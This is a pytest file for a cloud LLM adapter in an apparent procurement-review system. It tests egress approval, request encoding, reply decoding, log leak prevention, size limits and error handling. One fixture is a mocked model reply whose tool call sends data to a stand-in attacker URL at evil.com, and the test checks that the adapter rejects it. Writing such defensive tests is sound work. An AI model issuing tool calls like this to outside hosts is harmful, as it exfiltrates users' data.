import json
import logging
import uuid
from datetime import UTC, datetime
from pathlib import Path

import httpx
import pytest

from procurement_review.domain.enums import ProcurementFamily
from procurement_review.domain.errors import DomainError
from procurement_review.domain.models import (
    CaseFacts,
    MaskingSession,
    OutboundDraft,
    ProviderConfig,
    ProviderReply,
    Review,
    VersionRef,
)
from procurement_review.egress.approvals import approve
from procurement_review.egress.dispatcher import dispatch
from procurement_review.egress.payload import prepare_egress
from procurement_review.masking.detector import RuleBasedDetector
from procurement_review.providers.base import ProviderAdapter
from procurement_review.providers.cloud import CloudAdapter
from procurement_review.storage.repository import Repository
from procurement_review.storage.secrets import FakeSecretStore
from procurement_review.storage.vault import ArtifactStore


@pytest.fixture
def secret_store() -> FakeSecretStore:
    store = FakeSecretStore()
    store.set_key("approved_cloud_api_key", b"sk-approved-test-api-key-99999")
    return store


@pytest.fixture
def artifact_store(tmp_path: Path, secret_store: FakeSecretStore) -> ArtifactStore:
    vault_root = tmp_path / "vault"
    return ArtifactStore(root=vault_root, secrets=secret_store)


@pytest.fixture
def repo(tmp_path: Path, artifact_store: ArtifactStore) -> Repository:
    db_path = tmp_path / "app.db"
    return Repository(db=db_path, artifacts=artifact_store)


@pytest.fixture
def detector() -> RuleBasedDetector:
    return RuleBasedDetector()


@pytest.fixture
def cloud_config() -> ProviderConfig:
    return ProviderConfig(
        provider="approved_cloud",
        endpoint="https://api.approved-cloud.example.com/v1/chat/completions",
        model="approved-review-v1",
        credential_ref="approved_cloud_api_key",
        price_version="2026-10-15",
        rate_limits={"rpm": 60, "tpm": 100000, "max_request_bytes": 1048576},
    )


@pytest.fixture
def cloud_adapter(cloud_config: ProviderConfig) -> CloudAdapter:
    return CloudAdapter(config=cloud_config)


def make_review_and_run(repo: Repository) -> tuple[Review, str]:
    cid = str(uuid.uuid4())
    facts = CaseFacts(
        review_baseline_date="2026-10-15",
        procurement_unit="資安審查專案組",
        service_scope="雲端供應商審查適配器測試",
        unknown_fields=[],
    )
    review = Review(
        case_id=cid,
        title="雲端供應商整合測試案",
        contract_type=ProcurementFamily.SERVICES,
        contract_version="1.0",
        original_file_hash="abcd1234efgh5678abcd1234efgh5678",
        facts=facts,
        created_by="auditor",
        created_at=datetime.now(UTC),
    )
    saved_review = repo.save_review(review, expected_revision=None)
    rule_ref = VersionRef(id=str(uuid.uuid4()), version="1.0", sha256="rule-cloud-hash-01")
    run = repo.create_run(saved_review.case_id, rule_refs=[rule_ref])
    return saved_review, run.run_id


def test_cloud_adapter_implements_protocol(cloud_adapter: CloudAdapter):
    """驗證 CloudAdapter 符合 ProviderAdapter Protocol 介面。"""
    assert isinstance(cloud_adapter, ProviderAdapter)
    assert isinstance(cloud_adapter.config, ProviderConfig)
    assert cloud_adapter.config.endpoint.startswith("https://")
    assert cloud_adapter.config.model == "approved-review-v1"


def test_cloud_adapter_uses_approved_exact_body(
    repo: Repository,
    detector: RuleBasedDetector,
    cloud_adapter: CloudAdapter,
    secret_store: FakeSecretStore,
):
    """驗證捕捉到的傳輸 body bytes 與 prepared.body 完全一致：assert captured_body == prepared.body。"""
    review, run_id = make_review_and_run(repo)
    draft = OutboundDraft(
        draft_id=str(uuid.uuid4()),
        run_id=run_id,
        plaintext_body="投標廠商應提供零資料保留（ZDR）之雲端服務，並經本院核准。",
        sensitive_token_count=0,
        assembled_at=datetime.now(UTC),
    )
    session = MaskingSession(
        session_id=str(uuid.uuid4()),
        case_id=review.case_id,
        detector_version="rule-based-v1",
        mapping_vault_ref="vault://masking/session-cloud-01",
        outbound_hash="dummy-outbound-hash",
        human_reviewed=True,
        roundtrip_ok=True,
    )

    prepared = prepare_egress(
        run_id=run_id,
        draft=draft,
        session=session,
        detector=detector,
        adapter=cloud_adapter,
        repo=repo,
    )

    approval = approve(
        request=prepared,
        actor="ciso_auditor",
        repo=repo,
        scope="cloud_adapter_verification",
    )

    captured_requests: list[httpx.Request] = []

    def mock_handler(request: httpx.Request) -> httpx.Response:
        captured_requests.append(request)
        return httpx.Response(
            200,
            json={
                "id": "chatcmpl-approved-999",
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": json.dumps({"findings": []}),
                        },
                        "finish_reason": "stop",
                    }
                ],
                "usage": {"prompt_tokens": 30, "completion_tokens": 15, "total_tokens": 45},
            },
        )

    transport = httpx.MockTransport(mock_handler)

    reply = dispatch(
        prepared.request_id,
        approval.approval_id,
        repo=repo,
        transport=transport,
        secrets=secret_store,
        adapter=cloud_adapter,
    )

    assert len(captured_requests) == 1
    captured_body = captured_requests[0].content
    # 核心斷言：assert captured_body == prepared.body
    assert captured_body == prepared.body
    assert isinstance(reply, ProviderReply)
    assert reply.finish_reason == "stop"


def test_cloud_adapter_encode_schema(cloud_adapter: CloudAdapter):
    """驗證 encode 依標準 JSON 格式序列化，且不任意增加未經審閱之上下文。"""
    draft = OutboundDraft(
        draft_id=str(uuid.uuid4()),
        run_id=str(uuid.uuid4()),
        plaintext_body="供應商應具備 SOC2 Type II 認證報告。",
        sensitive_token_count=0,
        assembled_at=datetime.now(UTC),
    )
    encoded = cloud_adapter.encode(draft)
    assert isinstance(encoded, bytes)

    payload = json.loads(encoded.decode("utf-8"))
    assert payload["model"] == "approved-review-v1"
    assert "messages" in payload
    assert payload["messages"][0]["role"] == "user"
    assert payload["messages"][0]["content"] == draft.plaintext_body
    # 嚴禁注入額外文件或未核准 prompt
    assert len(payload["messages"]) == 1


def test_cloud_adapter_decode_usage_missing(cloud_adapter: CloudAdapter):
    """驗證未提供用量時：assert reply.usage is None。"""
    response_no_usage = json.dumps(
        {
            "id": "chatcmpl-no-usage-123",
            "choices": [
                {
                    "message": {
                        "role": "assistant",
                        "content": json.dumps({"findings": []}),
                    },
                    "finish_reason": "stop",
                }
            ],
            # usage 缺失
        }
    ).encode("utf-8")

    reply = cloud_adapter.decode(response_no_usage, request_id=str(uuid.uuid4()))
    assert isinstance(reply, ProviderReply)
    # 核心斷言：assert reply.usage is None
    assert reply.usage is None
    assert reply.finish_reason == "stop"


def test_cloud_adapter_decode_tool_call_rejected(cloud_adapter: CloudAdapter):
    """驗證模型嘗試 tool call 時嚴格拒絕：with pytest.raises(DomainError): adapter.decode(tool_call_response)。"""
    tool_call_response = json.dumps(
        {
            "id": "chatcmpl-tool-call-123",
            "choices": [
                {
                    "message": {
                        "role": "assistant",
                        "content": None,
                        "tool_calls": [
                            {
                                "id": "call_abc123",
                                "type": "function",
                                "function": {
                                    "name": "read_external_url",
                                    "arguments": '{"url": "https://malicious.evil.com/leak"}',
                                },
                            }
                        ],
                    },
                    "finish_reason": "tool_calls",
                }
            ],
            "usage": {"prompt_tokens": 20, "completion_tokens": 10, "total_tokens": 30},
        }
    ).encode("utf-8")

    # 核心斷言：with pytest.raises(DomainError): adapter.decode(tool_call_response)
    with pytest.raises(DomainError) as exc_info:
        cloud_adapter.decode(tool_call_response)

    assert exc_info.value.code == "TOOL_CALL_REJECTED"


def test_cloud_adapter_decode_refusal(cloud_adapter: CloudAdapter):
    """驗證模型拒絕回答 (Refusal) 正確處理。"""
    refusal_response = json.dumps(
        {
            "id": "chatcmpl-refusal-123",
            "choices": [
                {
                    "message": {
                        "role": "assistant",
                        "content": None,
                        "refusal": "I cannot fulfill this request due to safety policies.",
                    },
                    "finish_reason": "refusal",
                }
            ],
            "usage": {"prompt_tokens": 10, "completion_tokens": 10, "total_tokens": 20},
        }
    ).encode("utf-8")

    reply = cloud_adapter.decode(refusal_response, request_id=str(uuid.uuid4()))
    assert reply.finish_reason == "refusal"


def test_cloud_adapter_decode_truncated(cloud_adapter: CloudAdapter):
    """驗證輸出截斷 (length / max_tokens) 正確處理。"""
    truncated_response = json.dumps(
        {
            "id": "chatcmpl-truncated-123",
            "choices": [
                {
                    "message": {
                        "role": "assistant",
                        "content": "incomplete text...",
                    },
                    "finish_reason": "length",
                }
            ],
            "usage": {"prompt_tokens": 500, "completion_tokens": 4096, "total_tokens": 4596},
        }
    ).encode("utf-8")

    reply = cloud_adapter.decode(truncated_response, request_id=str(uuid.uuid4()))
    assert reply.finish_reason == "length"


def test_cloud_adapter_zero_leak_logging(cloud_adapter: CloudAdapter, caplog: pytest.LogCaptureFixture):
    """驗證錯誤時絕不洩漏原始 response 進一般日誌。"""
    secret_string = "SUPER_SECRET_PAYLOAD_UNMASKED_PII_987654321"
    malformed_body = f'{{"choices": [{{"message": "{secret_string}"}}]}} INVALID_JSON_SYNTAX'.encode()

    with caplog.at_level(logging.DEBUG), pytest.raises(DomainError) as exc_info:
        cloud_adapter.decode(malformed_body)

    assert exc_info.value.code == "DECODE_ERROR"
    # 核心安全保證：日誌與錯誤訊息中嚴禁出現原始 response 內容
    assert secret_string not in caplog.text
    assert secret_string not in str(exc_info.value)


def test_cloud_adapter_rejects_oversized_payload(cloud_adapter: CloudAdapter):
    """驗證超過上限之 request payload 拒絕出站。"""
    oversized_text = "A" * (1024 * 1024 + 100)  # > 1MB
    draft = OutboundDraft(
        draft_id=str(uuid.uuid4()),
        run_id=str(uuid.uuid4()),
        plaintext_body=oversized_text,
        sensitive_token_count=0,
        assembled_at=datetime.now(UTC),
    )

    with pytest.raises(DomainError) as exc_info:
        cloud_adapter.encode(draft)

    assert exc_info.value.code == "PAYLOAD_TOO_LARGE"


def test_cloud_adapter_cost_unknown_handling(cloud_adapter: CloudAdapter):
    """驗證成本資料不明時顯示未知，不能當 0。"""
    # 當 price_version 不明或計費費率未定時，cost 屬性回傳 None 或標示未知
    cost = cloud_adapter.estimate_cost(prompt_tokens=1000, completion_tokens=500)
    assert cost is None or cost == "unknown"


def test_cloud_adapter_egress_rate_limit_and_server_error(
    repo: Repository,
    detector: RuleBasedDetector,
    cloud_adapter: CloudAdapter,
    secret_store: FakeSecretStore,
):
    """驗證 429、5xx 錯誤在受控分派時正確轉為 DomainError。"""
    review, run_id = make_review_and_run(repo)
    draft = OutboundDraft(
        draft_id=str(uuid.uuid4()),
        run_id=run_id,
        plaintext_body="合約第十二條測試內容",
        sensitive_token_count=0,
        assembled_at=datetime.now(UTC),
    )
    session = MaskingSession(
        session_id=str(uuid.uuid4()),
        case_id=review.case_id,
        detector_version="rule-based-v1",
        mapping_vault_ref="vault://masking/session-cloud-err",
        outbound_hash="hash-err",
        human_reviewed=True,
        roundtrip_ok=True,
    )

    prepared = prepare_egress(
        run_id=run_id,
        draft=draft,
        session=session,
        detector=detector,
        adapter=cloud_adapter,
        repo=repo,
    )
    approval = approve(
        request=prepared,
        actor="ciso_auditor",
        repo=repo,
        scope="error_handling_test",
        max_attempts=3,
    )

    # 1. 測試 HTTP 429
    transport_429 = httpx.MockTransport(lambda req: httpx.Response(429, text="Too Many Requests"))
    with pytest.raises(DomainError) as exc_429:
        dispatch(
            prepared.request_id,
            approval.approval_id,
            repo=repo,
            transport=transport_429,
            secrets=secret_store,
            adapter=cloud_adapter,
        )
    assert exc_429.value.code == "RATE_LIMITED"

    # 2. 測試 HTTP 500
    transport_500 = httpx.MockTransport(lambda req: httpx.Response(500, text="Internal Server Error"))
    with pytest.raises(DomainError) as exc_500:
        dispatch(
            prepared.request_id,
            approval.approval_id,
            repo=repo,
            transport=transport_500,
            secrets=secret_store,
            adapter=cloud_adapter,
        )
    assert exc_500.value.code == "PROVIDER_ERROR"
